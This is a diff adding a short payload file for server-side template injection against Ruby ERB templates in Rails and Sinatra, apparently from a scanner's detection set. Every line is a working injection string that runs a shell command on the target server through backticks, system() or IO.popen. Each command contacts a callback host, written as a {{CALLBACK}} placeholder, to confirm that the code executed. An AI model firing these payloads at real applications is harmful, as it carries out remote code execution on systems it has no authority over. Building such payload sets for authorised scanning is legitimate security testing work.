@@ -1,0 +1,5 @@
+# ERB SSTI payloads - Ruby template engine (Rails, Sinatra)
+# {{CALLBACK}} replaced with callback URL
+<%= `curl {{CALLBACK}}` %>
+<%= system("nslookup {{CALLBACK}}") %>
+<%= IO.popen("curl {{CALLBACK}}").read %>
